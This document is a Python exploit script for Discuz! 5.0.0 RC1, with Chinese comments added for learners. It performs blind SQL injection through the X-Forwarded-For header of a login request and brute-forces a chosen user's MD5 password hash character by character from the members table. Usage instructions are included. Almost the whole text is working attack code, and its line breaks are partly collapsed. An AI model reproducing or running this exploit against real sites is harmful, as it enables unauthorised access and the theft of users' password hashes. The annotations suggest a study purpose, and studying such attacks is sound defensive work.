#wofeiwo原创，pt007给程序做了一下注释，以方便其它人的学习：#!/usr/bin/env python#coding=utf-8import sys
import httplibfrom urlparse import urlparsefrom time import sleepdef injection(lenthofpass,realurl,path):    sys.stdout.write('[+]The uid='+sys.argv[2]+' password hash is: \n')    for num in range(1,lenthofpass+1): #相当于[1,...,32],num代表32位的MD5值        ran=range(97, 123) #ran=[97,...,122]，ASCII码的a-z        #for a1 in range(65,91): #a1=[65,90],ASCII码的A-Z        # ran.append(a1)        for a in range(48, 58): #a=[48,...,57],ASCII码的0-9            ran.append(a) #将序列a加入到序列ran中        for i in ran: #遍历ran序列,包括全部小写字母和数字            query = '\' union select 122,122,122,122,122,122,122,122 from cdb_members where uid=' + sys.argv[2] + ' AND ascii(substring(CONCAT(password),' + str(num) + ',1))=' + str(i) + ' /*'            #下面是一个字典:            header = {'Accept':'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*','Referer':'http://' + realurl[1] + path + 'logging.php?action=login','Accept-Language':'zh-cn','Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)','Connection':'Keep-Alive','Cache-Control':'no-cache','X-Forwarded-For':query,'Cookie':'cdb_sid=70KRjS; cdb_cookietime=2592000'}            data = "formhash=6a49b97f&referer=discuz.php&loginmode=&styleid=&cookietime=2592000&loginfield=username&username=test&password=123456789&questionid=0&answer=&loginsubmit=%E6%8F%90+%C2%A0+%E4%BA%A4"            #print header            #sys.exit(1)            http = httplib.HTTPConnection(realurl[1]) #连接到如：httplib.HTTPConnection('www.cwi.nl')            http.request("POST", path + "logging.php?action=login&",data , header) #发送POS数据包            #sleep(1)            response = http.getresponse() #得到服务的响应包            re1 = response.read() #读出所有响应数据并存入ret1中            #print "re1中返回的内容为:"            print re1            if re1.find('SELECT') ==1: #re1中是否含有SELECT字符，是为1，否返回-1                print '[-] Unvalnerable host' #不存在漏洞                print '[-] Exit..'                sys.exit(1);            elif re1.find('ip3') == -1:#re1中是否含有ip3字符，是为1，否返回-1                sys.stdout.write(chr(i)) #输出正确的MD5密码值
                #print chr(i    )
                http.close()
                #sleep(1)
                #break
                    #print re1    #print '-----------------------------------------------'    http.close()    #sleep(1)    sys.stdout.write('\n') #打印回车def main ():    print 'Discuz! 5.0.0 RC1 SQL injection exploit'    print 'Codz by wofeiwo wofeiwo[0x40]gmail[0x2C]com\n'    if len(sys.argv) == 3:        url = urlparse(sys.argv[1])        if url[2:-1] != '/': #从元组中第三个到倒数第二个参数            u = url[2] + '/'        else:            u = url[2] #u=/dz/    else:        print "Usage: %s <url> <uid>" % sys.argv[0]        print "Example: %s http://127.0.0.1/dz/ 1" % sys.argv[0]        sys.exit(0)    lenth = 32 #长度为32    print '[+] Connect %s' % url[1]    print '[+] Trying...'    print '[+] Plz wait a long long time...'    injection(lenth, url, u)    print '[+] Finished'if __name__ == '__main__': 
    main()